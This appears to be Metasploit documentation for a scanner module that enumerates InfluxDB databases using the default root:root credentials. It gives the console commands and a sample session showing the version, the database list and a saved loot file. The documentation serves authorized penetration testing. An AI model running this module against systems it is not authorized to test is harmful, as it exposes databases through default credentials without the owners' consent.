This module enumerates databases on InfluxDB using the REST API using the default authentication of root:root.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/influxdb_enum```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

```
msf5 > use auxiliary/scanner/http/influxdb_enum
msf5 auxiliary(scanner/http/influxdb_enum) > set RHOST 172.25.65.20
RHOST => 172.25.65.20
msf5 auxiliary(scanner/http/influxdb_enum) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(scanner/http/influxdb_enum) > run

[+] 172.25.65.20:8086 - Influx Version: 1.5.1
[+] 172.25.65.20:8086 - Influx DB Found:

{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "databases",
          "columns": [
            "name"
          ],
          "values": [
            [
              "_internal"
            ]
          ]
        }
      ]
    }
  ]
}

[+] File saved in: /Users/unix/.msf4/loot/20180423050119_default_172.25.65.20_influxdb.enum_623871.txt
[*] Auxiliary module execution completed
```